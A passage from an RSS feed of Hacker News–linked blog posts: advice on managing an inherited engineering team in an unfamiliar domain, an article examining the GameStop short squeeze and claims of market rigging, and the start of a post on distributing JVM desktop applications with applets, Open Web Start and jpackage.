<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><section id="primary"><main id="main"><article id="post-531"><div><p>Here you are, sitting in your regular 1-1 with your boss. You expected it would be a routine check-in with her ‚Äì ‚ÄúHow have you been?‚Äù, ‚ÄúWhat‚Äôs the latest status on yesterday‚Äôs support bug?‚Äù. Then she gets to her update.</p><p>Dale, a peer manager, has decided to leave the company.</p><p>You will be leading their team of mobile engineers until further notice. You know nothing about building mobile apps ‚Äì you‚Äôve been a backend engineer your entire career. There are many unknowns. Kotlin, Swift, and their frameworks are foreign to you. You don‚Äôt know the team, and some of the engineers are older and more experienced than you.</p><p>This is a daunting situation for new leaders and managers. An unfamiliar domain, you don‚Äôt have any answers to questions, and some of the team are ten years your senior. How do you manage an existing engineering team that works in a different domain?</p><h2><strong>Accept that the team knows more than you</strong></h2><p>The first step is to accept that you don‚Äôt know anything about this existing team‚Äôs domain.</p><p>Next, remember what your job is. Your job is to help guide people to make better decisions, learn fast, and achieve goals. Not contribute code.</p><p>Pay attention to how the team communicates. What are the relationships within the team? Who influences decisions? Whose voice is not heard? Your first step is to understand how this team works and how the people on it collaborate.</p><p>By focusing on how the team collaborates you can work on the problems with the environment. These are the issues that few are paying attention to or don‚Äôt know how to address. Solving these problems is where you can contribute most to the team‚Äôs success.</p><h2><strong>Ask questions instead of giving answers</strong></h2><p>Asking questions is a core skill of great leaders.</p><p>When someone is talking, stop thinking about how you want to respond. Instead, listen. Look for details in what they are saying that give you a new question.</p><p>By focusing on questions, you achieve two things. First, you get the other person to talk more and give you more information on the topic. Answering questions will also build trust ‚Äì which is a critical resource for a to earn.</p><p>After a while, some of these questions will become redundant. What do you do when you have a deep understanding of the situation?</p><p>Ask more questions!</p><p>I know ‚Äì it‚Äôs redundant, but your questions change at this point. Focus more on asking questions that guide the group towards the goal of the conversation. For example, take a meeting that requires a decision is made. Your questions should look to identify the detail that‚Äôs preventing the decision.</p><p>Example questions include:</p><ul><li>What are the trade-offs and risks of each choice?</li><li>Who can we talk to to learn more?&nbsp;</li><li>How does this solution affect our team‚Äôs goals?&nbsp;</li></ul> <h2><strong>Partner with influential team members</strong></h2><p>Building trust with the team is critical to your success. You will need to build this through relationships with everyone on the team. The most important people to focus on are the influential ones.</p><p>These are the people everyone listens to. They mentor the rest of the team and help them grow. Decisions change once they raise their concerns. You won‚Äôt make any progress without them on your side.</p><p>How do you go about doing this?</p><p>You need to change your mindset of how you expect these relationships to be. Instead of being a coach, look to them as partners. This means you have to give them the space to own decisions in the domains where they are the experts. The partnership also requires transparency from you. Talk with these people about the problems you are observing on the team and see how they can help.</p><p>By agreeing on the problems in the environment, you will have the support needed to solve them.&nbsp;</p><h2><strong>Learn the existing team‚Äôs domain to follow conversations</strong></h2><p>At the start, you‚Äôre going to struggle to keep up with the team‚Äôs conversations. You must put in the time to learn the jargon and the systems that the team works in. You aren‚Äôt expected to become the foremost expert of the team‚Äôs codebases. Yet you must understand enough so you can empathize with the team. The goal is understanding since you will be an important advocate for these people.</p><p>Again, asking questions will be your quickest path to success. When in one on ones, if a report begins to talk about what they‚Äôre working on, dig deeper than normal. Don‚Äôt assume too much. Embrace your naivety.</p><p>Examples of questions to ask are:&nbsp;</p><ul><li>Why was the code implemented this way?&nbsp;</li><li>What was the original purpose of it?&nbsp;</li><li>What challenges exist when working with this code?</li><li>How did the team decide to use that specific library?</li><li>How does this code fit into the architecture of the application?</li></ul><p>You‚Äôll also need to do homework on your own to learn what the team works with. Beyond the languages, identify the application‚Äôs key frameworks, systems, and libraries. Ask the team for blog posts, design documents, and book recommendations. This information will provide you with the context you need to finally keep up with the team.</p><h2><strong>Embrace Your Diverse Experience</strong></h2><p>You are going to learn a lot from the team ‚Äì new technologies, jargon, systems, and more. This does not mean your experience is meaningless though.</p><p>There will be times where the team struggles with a problem because they think an imaginary constraint exists. I‚Äôve seen this before ‚Äì a client-focused team has had a history of problems working with a backend team. Things like adding a new API is assumed to take a high amount of effort.</p><p>This is where you can help with your backend experience. You can provide them insight into how the backend systems work.</p><p>Remember that your experience here is not about imposing your will. Instead, continue to focus on questions to identify assumptions. Once you discover these, you can start to add real value.</p><h2><strong>Conclusion</strong></h2><p>Becoming the manager of a new team is daunting no matter the situation. Particularly when the team works in a domain you have zero experience with. To succeed in this environment, you need to enter it from a place of curiosity. Ask a lot of questions, learn how the team does its work, and partner with influential team members. By taking these steps, you will discover the problems that are holding the team back.</p><p>With these problems in your mind, you can start to support the team in achieving their goals.</p><h3>How do you gain the trust of an existing team?</h3><p>I‚Äôd love to learn any tips you have to gain the trust of an existing team. The challenge of leading a group with strong relationships is daunting. How have you done it?</p><p>Let me know on&nbsp;<a href="https://twitter.com/ternarywat/status/1360804780927574016" target="_blank" rel="noreferrer noopener">Twitter</a>&nbsp;or&nbsp;<a href="https://www.linkedin.com/feed/update/urn:li:activity:6766571093806465024/" target="_blank" rel="noreferrer noopener">LinkedIn</a>.</p> <h3>Further Reading</h3><ul><li><a href="https://bookshop.org/a/22141/9781422188613" target="_blank" rel="noreferrer noopener sponsored nofollow">The First 90 Days: Proven Strategies for Getting Up to Speed Faster and Smarter</a></li></ul></div><!-- .entry-content --><!-- .entry-footer --></article><!-- #post-${ID} --><nav role="navigation" aria-label="Posts"><h2>Post navigation</h2></nav></main><!-- #main --></section><!-- #primary --></div></div>]]>
            </description>
            <link>https://buildthestage.com/how-to-manage-existing-engineering-teams/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26135955</guid>
            <pubDate>Sun, 14 Feb 2021 20:29:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Does GameStop Prove the Stock Market Is Rigged?]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 5 (<a href="https://news.ycombinator.com/item?id=26135842">thread link</a>) | @amoorthy
<br/>
February 14, 2021 | https://blog.thefactual.com/does-gamestop-prove-the-stock-market-is-rigged | <a href="https://web.archive.org/web/*/https://blog.thefactual.com/does-gamestop-prove-the-stock-market-is-rigged">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>


<p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>Just weeks ago, the share price for GameStop, a brick-and-mortar retailer of video games, saw its shares go from $17 to $483 before plummeting back down to <a href="https://www.marketwatch.com/investing/stock/gme"><span>around $50</span></a> within the span of a month. The story gripped the media (the subject of more than 3,000 articles) and the public's attention, painted as a <a href="https://www.cnbc.com/2021/01/27/gamestop-mania-explained-how-the-reddit-retail-trading-crowd-ran-over-wall-street-pros.html"><span>David vs. Goliath</span></a> story: small, plucky retail investors (non-professional individual investors) were taking on institutional investors (billion dollar firms, such as hedge funds, that invest with pooled resources) ‚Äî and supposedly <a href="https://markets.businessinsider.com/news/stocks/reddit-day-traders-investors-conflict-with-wall-street-hedge-funds-2021-1-1030016712"><span>winning big</span></a>. The soaring stock price finally crashed when popular trading platforms like Robinhood limited stock trading, coincidentally providing a way out for institutional investors who had been betting on the stock going down.</p>
<!--more-->
<p>Now, accusations are flying from both sides. Retail investors worry about collusion between Wall Street and trading platforms, whose decision to limit trading effectively put an end to the <a href="https://www.kiplinger.com/investing/602165/what-exactly-is-a-short-squeeze"><span>short squeeze</span></a> that big funds were trapped in. Meanwhile, Wall Street has lodged complaints about market manipulation that cost them billions. So, what really happened? Does the incident stand up to its underdog narrative or is it evidence that the stock market unfairly benefits Wall Street firms over everyday Americans? This week, The Factual looked at <a href="https://docs.google.com/spreadsheets/d/1CfG95Z047Dn-Q8Yip-JZxhdC0K7iKb4PAWLAD0Lanek/edit?usp=sharing"><span>highly rated news articles</span></a> from 20 sources across the political spectrum to find some answers.</p>
<blockquote>
<p><strong>What is shorting?</strong> Shorting is when an investor bets against a stock rising in the future. During a short, an investor ‚Äúborrows‚Äù shares of a specific stock and immediately sells them with the intention of buying the same number of shares back at a later date, for a lower price, before returning them to the original owner. If the stock depreciates over that period, the borrower gets to pocket the difference between the initial selling price and the later purchasing price. However, if the stock price increases, the borrower ends up losing money since they have to repurchase shares at a higher price before returning them. In January, institutional investors were shorting GME on a huge scale, and retail investors were purchasing GME shares to raise and keep the price high.</p>
<p><strong>What is a short squeeze? </strong>A short squeeze can happen when those shorting a stock are forced to repurchase shares at a higher price due to market movements. This repurchasing at higher prices can cause the stock‚Äôs price to climb even higher. In the case of GME, the activity of retail investors forced the large firms shorting the stock to repurchase shares at huge losses.&nbsp;</p>
</blockquote>
<p><strong>GameStop (GME) Share Price and Volume</strong></p>
<p><img src="https://lh6.googleusercontent.com/ZWC6lPja-6dOewgImUCpOa6l0STcuw3JPuGVsvLeqV0u0vhQ7IaILo1X0y4qTg0ktvE9qJLpoyp8yzon3DAE_amlIBi9HMP6kLYRpD6hlUVLrsm6xAcxfo7nmqdDPgb8Z71h3sPk" width="823"></p>

<h4><strong>Was There Foul Play?</strong></h4>
<div><p>As a social media-driven frenzy of buying drove the price of GME ever-higher on the week of January 25, the investment rationale for <a href="https://theconversation.com/wallstreetbets-is-disrupting-financial-markets-possibly-permanently-154355"><span>vigilante small investors</span></a>, largely associated with the online Reddit forum <a href="https://www.reddit.com/r/wallstreetbets/"><span>r/WallStreetBets</span></a>, was clear: buy and hold. Widespread purchasing of GME would generate returns for those buying in, often at the expense of big investors. These big investors who had shorted the stock were thus forced to buy even more shares ‚Äî raising the price still higher ‚Äî or risk facing even greater losses. Then things changed. Retail investors found themselves unable to continue purchasing shares as platforms like Robinhood and Webull limited buys, citing <a href="https://www.cnet.com/personal-finance/robinhood-backlash-heres-what-you-should-know-about-the-gamestop-stock-controversy/"><span>heightened capital requirements</span></a> due to the unprecedented increase in investments. This seemingly permitted large institutional investors to stop the bleeding and close positions before more damage was done.&nbsp;</p></div>
<p><img src="https://lh5.googleusercontent.com/JymbmnVOvmovmwpWZuM5b7qJUB2jBUdkbmPoAJTeDAWTNyb-vsW6dBfUui3m13iOlmWhqSDy0ANC1R4u39fYwTqz40UQskNB1k5DDgYvxHedNaO4aMvjIUvWO23sDZVq61fJI4jZ" width="478" height="299"><br>Source: <a href="https://twitter.com/RobinhoodApp/status/1354805613566410756?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1354805613566410756%7Ctwgr%5E%7Ctwcon%5Es1_&amp;ref_url=https%3A%2F%2Fwww.cnet.com%2Fpersonal-finance%2Frobinhood-backlash-heres-what-you-should-know-about-the-gamestop-stock-controversy%2F"><span>Twitter</span></a></p>
<p>This turn of events immediately drew ire from those concerned with the potential for foul play, including diametrically opposed <a href="https://www.nbcnews.com/politics/politics-news/gamestop-story-isn-t-populist-fairy-tale-n1256623"><span>political figures</span></a> like Democratic Representative Alexandria Ocasio-Cortez and Republican Senator Ted Cruz. However, many now accept the capital requirements as a plausible <a href="https://www.washingtonexaminer.com/news/the-gamestop-reddit-story-goes-beyond-us-vs-them"><span>explanation</span></a>, not the result of some orchestrated plot. Firms have to have a certain amount of capital <a href="https://reason.com/2021/02/09/why-wallstreetbets-and-bitcoiners-got-so-excited-about-gamestop/"><span>on hand</span></a> to cover trades, and Robinhood had to take action to cover the exponential increase in trading volume, at one point needing to raise <a href="https://www.washingtonpost.com/business/2021/02/08/gamestop-wallstreet-wealth/"><span>$3.4 billion</span></a> to cover new deposits. A forthcoming investigation of what occurred will work to ensure this explanation is valid.&nbsp;</p>
<p>In the meantime, users of such platforms can‚Äôt help but point to <a href="https://www.nbcnews.com/politics/politics-news/gamestop-story-isn-t-populist-fairy-tale-n1256623"><span>reasons for collusion</span></a>. Robinhood <a href="https://www.washingtonpost.com/business/2021/01/29/robinhood-citadel-gamestop-reddit/"><span>directs</span></a> ‚Äúmore than half of its customer orders‚Äù through Citadel Securities, a ‚Äúfinancial-services giant.‚Äù Part of Citadel came to the <a href="https://www.chicagotribune.com/business/ct-biz-gamestop-robinhood-citadel-ken-griffin-20210129-pz3ln7d6wra5rbpno7nb5rgvgm-story.html"><span>rescue of Melvin Capital</span></a> (a major fund which lost as much as $4.5 billion), and its own fund, Citadel Advisors LLC, was likely <a href="https://wallstreetonparade.com/2021/02/citadel-didnt-just-bail-out-a-gamestop-short-seller-citadel-also-had-a-big-short-position-in-gamestop/"><span>trading in GameStop itself</span></a>, according to the latest available financial reporting from September 2020. Both Robinhood and Citadel have pleaded their innocence, but retail investors see a financial system that recoiled and readjusted when common people were reaping huge profits at the expense of powerful, connected firms. (Further accusations, including that Robinhood <a href="https://www.theverge.com/2021/1/28/22254857/robinhood-gamestop-amc-shares-sold-surprised-users#:~:text=No%2C%20Robinhood%20tells%20The%20Verge,without%20permission%20from%20its%20traders.&amp;text=Quite%20a%20number%20of%20Robinhood,down%20a%20dozen%20of%20them"><span>forcibly closed</span></a> some users‚Äô positions in GME and other stocks, appear to be false or misinformed.)</p>
<p>As Wall Street firms were taking big losses, the aggrieved parties decried ‚Äú<a href="https://www.wsj.com/articles/gamestop-mania-reveals-power-shift-on-wall-streetand-the-pros-are-reeling-11611774663"><span>market manipulation</span></a>‚Äù by retail investors ‚Äî effectively suggesting that small-time investors were the ones engaging in foul play. The argument is essentially that these buyers were coordinating in such a way to collectively manipulate the value of specific stocks. Experts have since pointed out that the level of coordination likely does <a href="https://www.marketwatch.com/story/is-gamestop-stock-being-manipulated-by-social-media-users-or-is-it-free-speech-legal-experts-weigh-in-11611636278"><span>not amount</span></a> to a level of legal culpability. The discussions of retail investors more likely fall in a gray area somewhere between organized market manipulation and perfectly legal discussions, captured by non-committal sentiments like ‚Äú<a href="https://www.wsj.com/articles/we-like-the-stock-the-anatomy-of-a-meme-11612542783"><span>we like the stock</span></a>.‚Äù Furthermore, skeptics wonder how hedge funds can take issue with retail investors pursuing a strategy to shift the value of a stock when Wall Street firms regularly <a href="https://prospect.org/power/gamestop-craziness-pulls-back-curtain-on-stock-market/"><span>employ such strategies</span></a> themselves.</p>
<div><p>Another concerning source of potential foul play comes from the ability for anyone to start and fuel trends on social media platforms and forums and then use those public movements to pursue greater profits. Forums like r/WallStreetBets allow experienced and novice investors to <a href="https://www.wsj.com/articles/melvin-capital-lost-53-in-january-hurt-by-gamestop-and-other-bets-11612103117"><span>intermingle anonymously</span></a>, and there is very little clarity about who is feeding information and for what reasons. Some have argued that this leaves the door open to manipulation from large investors, many of whom are known to monitor online forums like r/WallStreetBets, or at the very least unscrupulous individuals seeking to take advantage of uninformed investors. In the last few years, several apps have even emerged that allow institutional investors to <a href="https://www.washingtonpost.com/business/2021/02/08/gamestop-wallstreet-wealth/"><span>monitor the trading preferences and discussions</span></a> of retail investors, helping to identify and take advantage of trends. This makes more sinister manipulation a possibility, though nothing has been verified thus far.</p></div>
<h4><strong>The House Always Wins</strong></h4>
<div><p>Focusing too much on accusations of foul play can distract from the essential details of the day. Who, in the end, made money? Forthcoming investigations will clarify who benefited the most, but evidence suggests that many of those who actually profited are likely to be firms like Senvest, who emerged with an eye-watering <a href="https://www.wsj.com/articles/this-hedge-fund-made-700-million-on-gamestop-11612390687"><span>$700 million in profit</span></a> from selling GME, not retail investors. The far more likely scenario is that more small-time investors lost money than made it, all while most big investors were leveraging their range of tools and depth of knowledge to turn a handsome profit.</p></div>
<p><img src="https://lh3.googleusercontent.com/vqTzCimciM3g9y0A5LRYQ_pGaq7zEvrJBNP98-qW5ugf-UEQkJ997ddwtopKVFiNFzl8Umq9YWI7blAbmb8MRfSGW0e5aygXc93F1CNyLoIa0sDaUfXJBIeHUP-6VIt5XrVIcXnx" width="583" height="420"></p>
<div><p>Similar short squeezes occurred with several other stocks, but GME was the most pronounced. Source: <a href="https://www.ft.com/content/04e6c524-389b-47fc-afaa-eb52c1e76048"><span>Financial Times</span></a></p></div>
<p>To begin with, the gradual growth and explosion of GME was driven not just by r/WallStreetBets followers but institutional investors who began investing in GME months ago. Senvest, for example, <a href="https://www.wsj.com/articles/this-hedge-fund-made-700-million-on-gamestop-11612390687"><span>owned 5% of the company</span></a> in October, and according to the <a href="https://www.washingtonpost.com/business/2021/02/08/gamestop-wallstreet-wealth/"><em><span>Washington Post</span></em></a>, the ‚Äúfour largest asset managers in the world together own 39 percent of GameStop shares.‚Äù Then, in a <a href="https://www.washingtonpost.com/business/2021/02/08/gamestop-wallstreet-wealth/"><span>flurry of activity</span></a> over three days, GME shares ‚Äúchanged hands 554 million times ‚Äî more than 11 times the number of total shares available,‚Äù including hundreds of millions of shares being traded at $200 to $300 a share. This volume of trading belies the perceived financial resources and trading rationale (buy and hold) of retail investors working through places like r/WallStreetBets, and rather suggests the hand of informed, large firms buying and selling huge numbers of shares. Simply put, the trading activity suggests that large firms were equally involved in the subsequent boom and bust as small-time investors, <a href="https://www.theguardian.com/business/2021/feb/03/david-v-goliath-narrative-in-gamestop-story-has-serious-flaws"><span>undermining</span></a> the ‚ÄúDavid vs. Goliath‚Äù narrative.</p>
<p>Thinking about the tools and financial acumen of both sides can tell us a lot about who the actual winners and losers are likely to be. On one side, we have well-informed <a href="https://www.washingtonpost.com/business/2021/02/08/gamestop-wallstreet-wealth/"><span>wealthy firms</span></a> with superior financial acumen, access to and understanding of more sophisticated financial products, and significant trading experience. On the other is a rabble of mostly new investors, enabled by the explosive growth of new trading platforms like Robinhood. These are largely teens and young adults ‚Äî the <a href="https://www.wsj.com/articles/teens-are-gambling-their-savings-on-gamestop-stock-their-parents-are-worried-11612540818"><span>average age</span></a> of users on Robinhood is just 31. A survey cited in <a href="https://www.marketwatch.com/story/losing-money-is-not-a-joke-gamestop-drama-drives-interest-in-financial-literacy-the-most-important-takeaway-of-all-11612880459"><span>MarketWatch</span></a> found ‚Äú44% of 1,600 self-directed investors in GameStop and AMC had less than a year of experience trading and another quarter had up to two year‚Äôs experience.‚Äù The <a href="https://www.vox.com/the-goods/22273192/teen-investors-gamestop-robinhood"><span>combination</span></a> of social media-driven hype, questionable crowd-sourced advice, and limited familiarity with sound investment strategies makes these investors far more likely to lose out, exemplified by users who bought in after GME shares were already worth hundreds of dollars. Robinhood is separately under fire for their <a href="https://www.cnet.com/news/even-before-gamestop-stock-frenzy-robinhood-raised-a-lot-of-red-flags/"><span>gamified trading platform</span></a>, which enables access for new investors but also exposes individuals with no trading experience to financial risk; the company is even facing a <a href="https://www.forbes.com/sites/jeffkauflin/2021/02/08/robinhood-hit-with-wrongful-death-suit-from-the-family-of-alex-kearns-alleging-customer-service-failures-and-reckless-practices/?sh=50fc57eead6d"><span>wrongful death lawsuit</span></a> after a 20-year-old user committed suicide in June 2020, fearing he owed over $700,000.</p>
<div><p>There are endless stories of the ‚Ä¶</p></div></span></p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.thefactual.com/does-gamestop-prove-the-stock-market-is-rigged">https://blog.thefactual.com/does-gamestop-prove-the-stock-market-is-rigged</a></em></p>]]>
            </description>
            <link>https://blog.thefactual.com/does-gamestop-prove-the-stock-market-is-rigged</link>
            <guid isPermaLink="false">hacker-news-small-sites-26135842</guid>
            <pubDate>Sun, 14 Feb 2021 20:17:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Distribution of JVM Desktop Applications]]>
            </title>
            <description>
<![CDATA[
Score 126 | Comments 90 (<a href="https://news.ycombinator.com/item?id=26135532">thread link</a>) | @nfrankel
<br/>
February 14, 2021 | https://blog.frankel.ch/state-jvm-desktop-frameworks/6/ | <a href="https://web.archive.org/web/*/https://blog.frankel.ch/state-jvm-desktop-frameworks/6/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main"> <div> <article itemscope="" itemtype="http://schema.org/BlogPosting"> <meta itemprop="mainEntityOfPage" content="//state-jvm-desktop-frameworks/6/"> <meta itemprop="description" content="">  <figure itemscope="" itemprop="image" itemtype="http://schema.org/ImageObject"> <meta itemprop="url" content="https://blog.frankel.ch/assets/resources/state-jvm-desktop-frameworks/tree-flower-jungle-usa-garden-mailbox-1148044-pxhere.com.jpg"> </figure> <section> <div itemprop="articleBody"> <p>The previous posts of this series focused on different frameworks to develop JVM-based applications.</p> <p>This is the 6<sup>th</sup> post in the The state of JVM desktop frameworks focus series.Other posts include:</p> <ol><li><span><a href="https://blog.frankel.ch/state-jvm-desktop-frameworks/1/" target="_blank" rel="noopener">The state of JVM desktop frameworks: introduction</a></span></li><li><span><a href="https://blog.frankel.ch/state-jvm-desktop-frameworks/2/" target="_blank" rel="noopener">The state of JVM desktop frameworks: Swing</a></span></li><li><span><a href="https://blog.frankel.ch/state-jvm-desktop-frameworks/3/" target="_blank" rel="noopener">The state of JVM desktop frameworks: SWT</a></span></li><li><span><a href="https://blog.frankel.ch/state-jvm-desktop-frameworks/4/" target="_blank" rel="noopener">The state of JVM desktop frameworks: TornadoFX</a></span></li><li><span><a href="https://blog.frankel.ch/state-jvm-desktop-frameworks/5/" target="_blank" rel="noopener">The state of JVM desktop frameworks: Jetpack Compose for Desktop</a></span></li><li><span><em>Distribution of JVM desktop applications</em> (this post)</span></li></ol> <p>Distributing applications on a couple of computers inside the same company is not an issue. A lot of products are available for automating the pushing of files onto computers. Issues might start to appear when you need to coordinate the deployment across different physical sites.</p> <p>However, the biggest problem is when computers are not known in advance: in that case, it‚Äôs not possible to push. For that reason, two decades ago, we saw a move from client-server architectures to web-based architectures.</p> <p>The remaining question is how to deploy a Java desktop application. In this post, we are going to go through some options to distribute this kind of application.</p> <div> <h2 id="applets">Applets</h2> <div> <p>While not strictly about desktop applications, I believe it‚Äôs a good idea to mention <a href="https://en.wikipedia.org/wiki/Java_applet" target="_blank" rel="noopener">applets</a> in a post about distributing Java apps.</p> <p>Applets were the first way to make Java applications available remotely. The idea was to host on a web server both bytecode (a single class or JAR) and reference it in an HTML page.</p> <div> <p>index.html</p> <div> <pre><code data-lang="html"><span>&lt;!DOCTYPE html&gt;</span>
<span>&lt;html&gt;</span>
  <span>&lt;body&gt;</span>
  <span>&lt;applet</span> <span>code=</span><span>"HelloWorld.class"</span> <span>height=</span><span>"640"</span> <span>width=</span><span>"480"</span><span>&gt;&lt;/applet&gt;</span>
  <span>&lt;/body&gt;</span>
<span>&lt;/html&gt;</span></code></pre> </div> </div> <p>Note that an applet runs client-side, thus requiring a local <abbr title="Java Runtime Environment">JRE</abbr>. It also mandates a browser plugin. Both are security concerns. That lead browser vendors to remove the support of plugins and in turn the Java team to deprecate applets in Java 9.</p> <div> <blockquote> <p>With modern browser vendors working to restrict or reduce the support of plugins like Flash, Silverlight, and Java in their products, developers of applications that rely on the Java browser plugin need to consider alternative options. Java developers currently relying on browser plugins should consider migrating from Java Applets to the plugin-free Java Web Start technology.</p> <p>Supporting Java in browsers is only possible for as long as browser vendors are committed to supporting standards-based plugins. By late 2015, many browser vendors had either removed or announced timelines for the removal of standards-based plugin support, while some are introducing proprietary browser-specific extension APIs. Consequently, Oracle is planning to deprecate the Java browser plugin in JDK 9.</p> <p>The deprecated plugin technology will be completely removed from the Oracle Java Development Kit (JDK) and Java Runtime Environment (JRE) in a future Java release TBD. Java Web Start applications do not rely on a browser plugin and will not be affected by these changes.</p> </blockquote>  </div> </div> </div> <div> <h2 id="open-web-start">Open Web Start</h2> <div> <p>After applets, the next alternative for distributing Java applications is Java Web Start. This is the canonical way for desktop applications. As a personal note, I used it more than 15 years ago with Java 1.4. This <a href="https://www.oracle.com/java/technologies/javase/jws-archive-download.html" target="_blank" rel="noopener">page</a> seems to confirm JDK 1.4.2 was the first version to provide it natively, as opposed to as a separate download. Yet, Oracle deprecated Java Web Start in JDK 9 and removed it in JDK 11.</p> <p>This left JWS users without any option. <a href="https://karakun.com/" target="_blank" rel="noopener">Karakun</a> is a company that took ownership of the project. It provides it as a separate package under the name <a href="https://openwebstart.com/" target="_blank" rel="noopener">Open Web Start</a> and the software is the same.</p> <p>To distribute an application via Open Web Start, in addition to the JAR itself, you need to provide a <abbr title="Java Network Launching Protocol">JNLP</abbr> file. This file serves as an external deployment descriptor of a sort. Features of JNLP are quite exhaustive:</p> <ul><li><span>Add a shortcut on the user‚Äôs desktop</span></li><li><span>Whether the application can run offline after you‚Äôve downloaded it</span></li><li><span>Update policies</span></li><li><span>Optional list of native libraries</span></li><li><span>etc.</span></li></ul> <p>The complete <a href="https://docs.oracle.com/javase/tutorial/deployment/deploymentInDepth/jnlpFileSyntax.html" target="_blank" rel="noopener">specifications</a> are still available on Oracle‚Äôs site.</p> <p>Let‚Äôs create a JNLP to distribute our sample Swing application:</p> <div> <p>renamer.jnlp</p> <div> <pre><code data-lang="xml"><span>&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span>&lt;jnlp</span> <span>spec=</span><span>"1.0+"</span> <span>codebase=</span><span>""</span> <span>href=</span><span>""</span><span>&gt;</span>
  <span>&lt;information&gt;</span>
    <span>&lt;title&gt;</span>File Renamer<span>&lt;/title&gt;</span>
    <span>&lt;vendor&gt;</span>Nicolas Fr√§nkel<span>&lt;/vendor&gt;</span>
    <span>&lt;offline-allowed/&gt;</span>
  <span>&lt;/information&gt;</span>
  <span>&lt;resources&gt;</span>
    <span>&lt;j2se</span> <span>version=</span><span>"11+"</span> <span>/&gt;</span>
    <span>&lt;jar</span> <span>href=</span><span>"https://path.to/archive.jar"</span>                              <i data-value="1"></i><b>(1)</b>
         <span>main=</span><span>"true"</span> <span>/&gt;</span>                                                  <i data-value="2"></i><b>(2)</b>
  <span>&lt;/resources&gt;</span>
  <span>&lt;security&gt;</span>
    <span>&lt;all-permissions</span> <span>/&gt;</span>                                                  <i data-value="3"></i><b>(3)</b>
  <span>&lt;/security&gt;</span>
  <span>&lt;application-desc</span> <span>name=</span><span>"File Renamer"</span>
                    <span>main-class=</span><span>"ch.frankel.blog.renamer.RenamerAppKt"</span> <span>/&gt;</span> <i data-value="4"></i><b>(4)</b>
  <span>&lt;update</span> <span>check=</span><span>"background"</span><span>/&gt;</span>
<span>&lt;/jnlp&gt;</span></code></pre> </div> </div> <div> <table> <tbody><tr> <td><i data-value="1"></i><b>1</b></td> <td>Path to the JAR</td> </tr> <tr> <td><i data-value="2"></i><b>2</b></td> <td>Flag that marks the JAR as containing the main class</td> </tr> <tr> <td><i data-value="3"></i><b>3</b></td> <td>The Renamer application reads and writes the filesystem, it requires permissions. Note that permission grant is <strong>not</strong> fine-grained. Also, permissions require you to sign the JAR.</td> </tr> <tr> <td><i data-value="4"></i><b>4</b></td> <td>Class that contains the entry-point (the <code>main</code> method)</td> </tr> </tbody></table> </div> </div> </div> <div> <h2 id="jpackage">jpackage</h2> <div> <p>While Open Web Start is not available as part of the JDK anymore, the <a href="https://docs.oracle.com/en/java/javase/14/jpackage/packaging-overview.html" target="_blank" rel="noopener"><code>jpackage</code></a> tool is. It‚Äôs included since JDK 14. As its name implies, <code>jpackage</code> allows you to create a native installer from a JAR.</p> <p>Its basic usage is straightforward:</p> <div> <div> <pre><code data-lang="bash">jpackage <span>--input</span> target <span>--main-jar</span> renamer-swing-1.0.jar    <i data-value="1"></i><b>(1)</b></code></pre> </div> </div> <div> <table> <tbody><tr> <td><i data-value="1"></i><b>1</b></td> <td>Assume a Maven project that generates the JAR in the <code>target</code> subfolder</td> </tr> </tbody></table> </div> <p>On a macOS computer, the above command creates a <code>RenamerAppKt-1.0.dmg</code> installer. It contains a macOS application with the following structure:</p> <p><span><img src="https://blog.frankel.ch/assets/resources/state-jvm-desktop-frameworks/jpackage-app-structure.jpg" alt="Application‚Äôs structure as created by the jpackage" width="236" height="408"></span></p> <p>The structure includes:</p> <ul><li><span>The JAR</span></li><li><span>A JRE - the one associated with the <code>jpackage</code> command that created the installer</span></li><li><span>macOS-specific files</span></li></ul> <p>While the sample JAR is 1.5 MB, the installer is more than 50 MB because of the embedded Java runtime.</p> </div> </div> <div> <h2 id="jlink">jlink</h2> <div> <p><code>jlink</code> is not a real distribution mechanism but I believe it still deserves a mention. It allows you to create a custom runtime with a dedicated launcher script for your applications. It‚Äôs part of the JDK since Java 9.</p> <p>While it can in theory <a href="https://medium.com/azulsystems/using-jlink-to-build-java-runtimes-for-non-modular-applications-9568c5e70ef4" target="_blank" rel="noopener">work with any application</a>, it shines with modularized applications. Such applications need to describe the modules they depend on in a <code>module-info.java</code>.</p> <p>The main task is to modularize the application. For our sample app, the <code>module-info.java</code> file is:</p> <div> <p>module-info.java</p> <div> <pre><code data-lang="java"><span>module</span> <span>filerenamer</span><span>.</span><span>swing</span> <span>{</span>
    <span>requires</span> <span>eventbus</span><span>;</span>                            <i data-value="1"></i><b>(1)</b> <i data-value="2"></i><b>(2)</b>
    <span>requires</span> <span>java</span><span>.</span><span>desktop</span><span>;</span>                        <i data-value="1"></i><b>(1)</b>
    <span>requires</span> <span>kotlin</span><span>.</span><span>stdlib</span><span>;</span>                       <i data-value="1"></i><b>(1)</b>
    <span>exports</span> <span>ch</span><span>.</span><span>frankel</span><span>.</span><span>blog</span><span>.</span><span>renamer</span> <span>to</span> <span>eventbus</span><span>;</span>  <i data-value="3"></i><b>(3)</b>
